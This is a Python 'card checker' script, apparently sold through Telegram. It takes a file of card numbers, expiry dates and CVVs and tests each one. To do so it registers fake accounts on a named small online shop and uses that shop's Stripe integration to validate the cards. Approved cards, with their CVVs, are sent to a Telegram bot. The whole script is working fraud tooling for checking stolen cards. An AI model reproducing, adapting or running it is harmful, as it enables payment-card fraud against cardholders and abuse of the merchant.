import requests
import re
import random
import string
from colorama import Fore, init
import user_agent
import json
import os
from datetime import datetime

# Initialize colorama
init()

# Shutdown Date and Time (YYYY, MM, DD, HH, MM)
SHUTDOWN_DATETIME = datetime(2025, 2, 28, 23, 59)  # Modify as needed

# Banner
# Banner
BANNER = f"""
{Fore.CYAN}
███████╗███╗   ██╗    █████╗ ██╗   ██╗████████╗██╗  ██╗
██╔════╝████╗  ██║   ██╔══██╗██║   ██║╚══██╔══╝██║  ██║
█████╗  ██╔██╗ ██║   ███████║██║   ██║   ██║   ███████║
██╔══╝  ██║╚██╗██║   ██╔══██║██║   ██║   ██║   ██╔══██║
██║     ██║ ╚████║   ██║  ██║╚██████╔╝   ██║   ██║  ██║
╚═╝     ╚═╝  ╚═══╝   ⚚╝  ⚚╝ ╚═════╝    ⚚╝   ⚚╝  ⚚╝
{Fore.YELLOW}
 ───────────────────────────────
 🔥 FN Auth Card Checker 🔥
 🛠️ Brought to you by Dev: ElectraOp
 🎯 Version: 2.0
 📢 Join our channel for more: [https://t.me/fn_network_reborn]
 ───────────────────────────────
{Fore.RESET}
"""

# Clear console and display banner
def clear_and_show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

# Check if the script should shut down
def check_shutdown():
    if datetime.now() >= SHUTDOWN_DATETIME:
        print(Fore.RED + "⛔ This script has expired. Please purchase for further use.")
        exit()

# Generate random email
def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

# Send formatted message to Telegram bot
def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    response = requests.post(url, data=data)
    return response.json()

# Format Approved CC Message for Telegram (Stylish Table with Emojis)
def format_telegram_message(ccx):
    try:
        card_number, exp_month, exp_year, cvv = ccx.split("|")
        return f"""
<b>✅ CARD APPROVED</b>
──────────────────────────────
💳 <b>Card:</b> <code>{card_number}</code>
📆 <b>Expiry:</b> <code>{exp_month}/{exp_year}</code>
🔐 <b>CVV:</b> <code>{cvv}</code>
──────────────────────────────
💸 <b>Stripe Charge:</b> ✅ $0.20
💵 <b>Square Charge:</b> ✅ $0.20
🔗 <b>Status:</b> <code>Charged Successfully</code>
dev: @FNxELECTRA (contact for purchase)
──────────────────────────────
🚀 <b>FN Auth - v2.0</b>
"""
    except ValueError:
        return f"<b>⚠️ Invalid Combo Format:</b> <code>{ccx}</code>"

# Main function
def main():
    clear_and_show_banner()
    check_shutdown()  # Check if script should shut down

    # User input
    combo = input(Fore.YELLOW + '📂 Enter Combo File Name: ' + Fore.RESET)
    token = input('🤖 Enter Telegram Bot Token: ')
    chat_id = input('💬 Enter Telegram Chat ID: ')

    # Open combo file
    try:
        with open(combo, "r") as file:
            lines = file.readlines()
    except FileNotFoundError:
        print(Fore.RED + f"⚠️ File '{combo}' not found. Exiting.")
        return

    start_num = 0
    for line in lines:
        start_num += 1
        ccx = line.strip().split('\n')[0]
        try:
            n, mm, yy, cvc = ccx.split("|")
        except ValueError:
            print(Fore.RED + f"{ccx} >> Invalid combo format ❌")
            continue

        if "20" in yy:  # Handle year format
            yy = yy.split("20")[1]

        user = user_agent.generate_user_agent()
        r = requests.Session()

        # Generate random email
        email = generate_random_account()

        # Define headers and data for requests
        headers = {
            "User-Agent": user,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "http://dogtoothfairy.co.uk/my-account",
        }

        try:
            # Fetch registration nonce
            response = r.get('http://dogtoothfairy.co.uk/my-account', headers=headers)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
            if not nonce_match:
                print(Fore.RED + f"{ccx} >> Failed to extract nonce ❌")
                continue
            nonce = nonce_match.group(1)

            # Register account
            data = {
                "email": email,
                "wc_order_attribution_source_type": "typein",
                "wc_order_attribution_referrer": "(none)",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "(direct)",
                "wc_order_attribution_utm_medium": "(none)",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": "http://dogtoothfairy.co.uk/my-account/",
                "wc_order_attribution_session_start_time": "2025-02-25 11:07:40",
                "wc_order_attribution_session_pages": "1",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": user,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            response = r.post('http://dogtoothfairy.co.uk/my-account', headers=headers, data=data)
            if response.status_code != 200:
                print(Fore.RED + f"{ccx} >> Registration failed ❌")
                continue

            # Fetch payment method nonce
            response = r.get('https://dogtoothfairy.co.uk/my-account/add-payment-method/', headers=headers)
            payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text)
            if not payment_nonce_match:
                print(Fore.RED + f"{ccx} >> Failed to extract payment nonce ❌")
                continue
            payment_nonce = payment_nonce_match.group(1)

            # Create Stripe payment method
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': user,
            }
            stripe_data = {
                "type": "card",
                "card[number]": n,
                "card[cvc]": cvc,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "billing_details[address][postal_code]": "10006",
                "billing_details[address][country]": "US",
                "payment_user_agent": "stripe.js/8586249c44; stripe-js-v3/8586249c44; payment-element; deferred-intent",
                "referrer": "https://dogtoothfairy.co.uk",
                "client_attribution_metadata[client_session_id]": "04680e16-66c9-4ba4-a446-b7cd5fae8731",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "guid": "b0e611ec-7d17-43e2-a699-774f8d55f2fdc360d2",
                "muid": "6978f72f-1dc5-4cdc-a34f-404b7953dcd96ccc4a",
                "sid": "67c31d24-07c5-472e-96f4-8e4ae11be3a910d5e9",
                "key": "pk_live_51N4lLTIC9p8GILNdWSgGORVr7lmOMMvglPVU4sgujOov1CpwDDQ4hikQZPyVuzZr7GPPwK3S7IY4tTxsSmdhzveA00NW603lMt",
                "_stripe_version": "2024-06-20",
            }
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
            if 'id' not in response.json():
                print(Fore.RED + f"{ccx} >> ERROR CARD ❌")
                continue

            payment_method_id = response.json()['id']

            # Add payment method to account
            headers = {
                "Host": "dogtoothfairy.co.uk",
                "content-length": "142",
                "sec-ch-ua-platform": '"Android"',
                "x-requested-with": "XMLHttpRequest",
                "user-agent": user,
                "accept": "*/*",
                "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Android WebView";v="132"',
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://dogtoothfairy.co.uk",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://dogtoothfairy.co.uk/my-account/add-payment-method/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                "priority": "u=1, i"
            }
            data = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": payment_method_id,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": payment_nonce,
            }
            response = r.post('https://dogtoothfairy.co.uk/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers, data=data)

            # Print the response for each card
            print(Fore.CYAN + f"{ccx} >> Response:")
            try:
                # Pretty-print the JSON response
                response_json = response.json()
                print(Fore.WHITE + json.dumps(response_json, indent=4))

                # Check if the payment was successful
                if response_json.get("success", False) and response_json.get("data", {}).get("status", "") == "succeeded":
                    print(Fore.GREEN + f"{ccx} >> APPROVED ✅")
                    # Send to Telegram
                    message = format_telegram_message(ccx)
                    send_to_telegram(token, chat_id, message)
                else:
                    print(Fore.RED + f"{ccx} >> DECLINED ❌")
            except:
                # If the response is not JSON, print the raw text
                print(Fore.WHITE + response.text)
                print(Fore.RED + f"{ccx} >> DECLINED ❌")

        except Exception as e:
            print(Fore.RED + f"{ccx} >> Error: {e} ❌")

# Run script
if __name__ == "__main__":
    main()